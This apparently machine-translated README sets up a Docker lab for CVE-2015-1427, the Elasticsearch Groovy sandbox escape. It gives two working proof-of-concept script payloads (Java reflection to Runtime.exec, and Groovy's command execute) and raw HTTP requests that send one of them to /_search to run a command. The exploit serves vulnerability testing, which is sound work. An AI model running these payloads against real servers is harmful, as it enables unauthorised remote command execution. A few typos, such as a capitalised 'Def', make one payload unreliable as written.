# ElasticSearch Groovy Sandbox Bypass && Code Execution Vulnerability (CVE-2015-1427) Test Environment

Jre version: openjdk: 8-jre

Elasticsearch version: v1.4.2

## Principle

Reference article:

- http://cb.drops.wiki/drops/papers-5107.html
- http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/
- https://github.com/XiphosResearch/exploits
- http://cb.drops.wiki/drops/papers-5142.html

After CVE-2014-3120, ElasticSearch's default dynamic scripting language was replaced with Groovy and a sandbox was added, but the default implementation of dynamic languages ​​is still supported by default. This vulnerability: 1. Is a sandbox bypass; 2. Is a Goovy code execution vulnerability.

## Groovy Language "Sandbox"

ElasticSearch supports the use of the "in the sandbox" of the Groovy language as a dynamic script, but it is clear that the official work is not done. Lupin and tang3 proposed two ways to execute commands:

1. Since there is a sandbox for executing Java code, lupin's method is to find ways to bypass the sandbox, such as using Java reflection.
2. Groovy was originally a language, so tang3 took a different approach and used the methods supported by the Groovy language to execute commands directly without using the Java language.

So, based on these two implementation vulnerabilities, we can get two different POCs.

Java sandbox bypass method:

```
java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("id").getText()
```

Goovy directly executes the command method:

```
Def command='id';def res=command.execute().text;res
```



## Vulnerability Testing

Compile and run the test environment

```
Docker-compose build
Docker-compose up -d
```

Since at least one data in es is required for the query, the following data packet is sent, and one data is added:

```
POST /website/blog/ HTTP/1.1
Host: your-ip: 9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "phithon"
}
```

Then send the packet containing the payload and execute any command:

```
POST /_search?pretty HTTP/1.1
Host: your-ip: 9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 156

{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\") .getRuntime().exec(\"id\").getText()"}}}
```

![](1.png)